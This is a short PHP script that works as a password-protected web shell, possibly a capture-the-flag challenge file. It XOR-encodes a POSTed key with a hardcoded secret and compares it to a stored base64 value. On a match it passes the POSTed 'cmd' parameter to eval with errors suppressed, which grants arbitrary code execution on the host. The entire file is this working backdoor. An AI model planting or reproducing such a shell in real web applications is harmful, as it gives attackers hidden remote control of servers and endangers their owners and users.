<?php

function encrypt($data, $key){
    $data = str_split($data);
    $key = str_split($key);
    $res = '';
    for($i=0; $i<count($data); $i++){
        $res .= chr(ord($data[$i]) ^ ord($key[$i % count($key)]));
    }
    return base64_encode($res);
}

$target = "OAESPhJGazhIRhA=";
$ps = "p1eas4_g1ve";

if(isset($_POST['cmd'])){
    if(isset($_POST['key']))
    {
        $key = $_POST['key'];
        if(encrypt($key, $ps) !== $target){
            die("");
        }
        echo "<pre>";
        $cmd = ($_POST['cmd']);
        @eval($cmd);
        echo "</pre>";
        die;
    }
}

?>